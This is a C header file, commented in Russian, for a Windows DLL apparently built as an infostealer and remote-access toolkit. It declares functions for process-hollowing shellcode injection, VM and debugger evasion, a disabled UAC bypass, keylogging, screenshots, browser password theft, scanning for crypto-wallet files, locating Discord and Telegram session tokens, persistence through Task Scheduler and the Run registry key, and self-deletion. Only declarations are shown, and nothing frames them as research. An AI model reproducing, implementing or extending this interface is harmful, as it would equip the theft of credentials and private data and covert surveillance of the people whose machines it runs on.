#ifndef INJECTOR_H
#define INJECTOR_H

#include <windows.h>

// Макрос для экспорта функций из DLL
#define EXPORT_FUNC extern "C" __declspec(dllexport)

/**
 * @brief Выполняет инъекцию шеллкода в указанный процесс с использованием техники Process Hollowing.
 *
 * @param targetProcessPath Полный путь к исполняемому файлу целевого процесса (например, "C:\\Windows\\System32\\notepad.exe").
 * @param shellcode Указатель на буфер с шеллкодом.
 * @param shellcodeSize Размер буфера с шеллкодом в байтах.
 * @param errorMsg Указатель на указатель char*, куда будет помещен адрес строки с сообщением об ошибке 
 *                 (если произошла ошибка). Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 * @return int 0 в случае успеха, ненулевое значение (код ошибки Windows или кастомный код) в случае ошибки.
 */
EXPORT_FUNC int inject_process_hollowing(
    LPCSTR targetProcessPath, 
    const unsigned char* shellcode, 
    DWORD shellcodeSize,
    char** errorMsg
);

/**
 * @brief Освобождает память, выделенную для сообщения об ошибке функцией inject_process_hollowing.
 *
 * @param errorMsg Указатель на строку с сообщением об ошибке, полученный от inject_process_hollowing.
 */
EXPORT_FUNC void free_error_message(char* errorMsg);

// Функция для проверки на виртуальное окружение
EXPORT_FUNC BOOL IsVMEnvironmentDetected();

// Функция для проверки наличия отладчика
EXPORT_FUNC BOOL IsDebuggerPresentDetected();

// Функция для UAC Bypass через Token Duplication и запуска команды (ОСТАВЛЕНО ЗАКОММЕНТИРОВАННЫМ ПОЛЬЗОВАТЕЛЕМ)
// EXPORT_FUNC int BypassUACAndExecute(const char* commandLineAnsi, char** errorMsg);

// --- Функции Кейлоггера ---

// Запускает кейлоггер (устанавливает хук и запускает поток обработки сообщений)
// Возвращает 0 при успехе, иначе код ошибки.
// errorMsg будет содержать сообщение об ошибке (требует free_error_message).
EXPORT_FUNC int StartKeylogger(char** errorMsg);

// Останавливает кейлоггер (снимает хук и останавливает поток)
// Возвращает 0 при успехе, иначе код ошибки.
EXPORT_FUNC int StopKeylogger(char** errorMsg);

// Возвращает накопленные логи в виде JSON-массива строк.
// Возвращает NULL, если логов нет или произошла ошибка.
// Вызывающая сторона ДОЛЖНА освободить возвращенную строку с помощью free_error_message.
EXPORT_FUNC char* GetKeyLogs();

// --- Функции Скриншотера ---

/**
 * @brief Захватывает текущий экран и возвращает его в виде BMP изображения, закодированного в Base64.
 *
 * @return char* Указатель на строку Base64 или NULL в случае ошибки. 
 *               Вызывающая сторона ДОЛЖНА освободить эту память с помощью FreeScreenshotData().
 */
EXPORT_FUNC char* CaptureScreenshot();

/**
 * @brief Освобождает память, выделенную для строки Base64 функцией CaptureScreenshot.
 *
 * @param base64Data Указатель на строку Base64, полученную от CaptureScreenshot.
 */
EXPORT_FUNC void FreeScreenshotData(char* base64Data);

// --- Функции кражи данных ---

/**
 * @brief Пытается извлечь учетные данные из поддерживаемых браузеров (Chrome, Edge, Firefox).
 *
 * @return char* Указатель на JSON-строку, содержащую массив объектов с учетными данными 
 *               (например, [{'origin_url': '...', 'username': '...', 'password': '...'}, ...])
 *               или NULL в случае ошибки или если ничего не найдено.
 *               Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 */
EXPORT_FUNC char* StealBrowserCredentials();

/**
 * @brief Рекурсивно сканирует указанный каталог на наличие файлов, соответствующих заданным маскам.
 *
 * @param startPath Путь к директории для начала сканирования (UTF-8).
 * @param fileMasks Маски файлов через точку с запятой (например, "*.wallet;*.dat;*.pdf") (UTF-8).
 * @param maxDepth Максимальная глубина рекурсии (0 - только текущий каталог, -1 - без ограничений).
 * @return char* Указатель на JSON-строку, содержащую массив полных путей к найденным файлам
 *               или NULL в случае ошибки или если ничего не найдено.
 *               Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 */
EXPORT_FUNC char* ScanFilesRecursive(const char* startPathUtf8, const char* fileMasksUtf8, int maxDepth);

/**
 * @brief Находит пути к файлам/папкам, потенциально содержащим токены/сессии для указанных приложений (Discord, Telegram).
 *
 * @param appNames Имена приложений через точку с запятой (например, "Discord;Telegram").
 * @return char* Указатель на JSON-строку, содержащую объект, где ключ - имя приложения,
 *               а значение - массив путей к релевантным файлам/папкам.
 *               (например, {"Discord": ["C:\\...\\Local Storage\\leveldb"], "Telegram": [...]})
 *               Возвращает NULL в случае ошибки или если ничего не найдено.
 *               Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 */
EXPORT_FUNC char* FindAppSessionFiles(const char* appNamesUtf8);

// --- Функции закрепления (Persistence) ---

/**
 * @brief Создает задачу в Планировщике Задач Windows для запуска указанного файла.
 *
 * @param taskNameW Имя задачи (WCHAR*).
 * @param executablePathW Путь к исполняемому файлу (WCHAR*).
 * @param argumentsW Аргументы командной строки для файла (WCHAR*).
 * @param errorMsg Указатель на указатель char*, куда будет помещен адрес строки с сообщением об ошибке
 *                 (если произошла ошибка). Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 * @return int 0 в случае успеха, HRESULT или кастомный код ошибки в случае неудачи.
 */
EXPORT_FUNC int PersistViaTaskScheduler(
    const WCHAR* taskNameW,
    const WCHAR* executablePathW,
    const WCHAR* argumentsW,
    char** errorMsg
);

/**
 * @brief Создает/обновляет значение в ключе реестра HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
 *        для запуска файла при входе пользователя.
 *
 * @param valueNameW Имя значения в реестре (WCHAR*).
 * @param executablePathW Путь к исполняемому файлу (WCHAR*).
 * @param errorMsg Указатель на указатель char*, куда будет помещен адрес строки с сообщением об ошибке
 *                 (если произошла ошибка). Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 * @return int 0 в случае успеха, код ошибки Windows (LSTATUS) в случае неудачи.
 */
EXPORT_FUNC int PersistViaRegistryRunKey(
    const WCHAR* valueNameW,
    const WCHAR* executablePathW,
    char** errorMsg
);

// --- Функции самоудаления ---

/**
 * @brief Запускает процесс cmd.exe для удаления указанного файла после небольшой задержки.
 * 
 * @param filePathToDeleteW Полный путь к файлу, который нужно удалить (WCHAR*).
 * @return int 0 в случае успешного запуска cmd.exe, иначе код ошибки Windows.
 */
EXPORT_FUNC int SelfDelete(const WCHAR* filePathToDeleteW);

#endif // INJECTOR_H 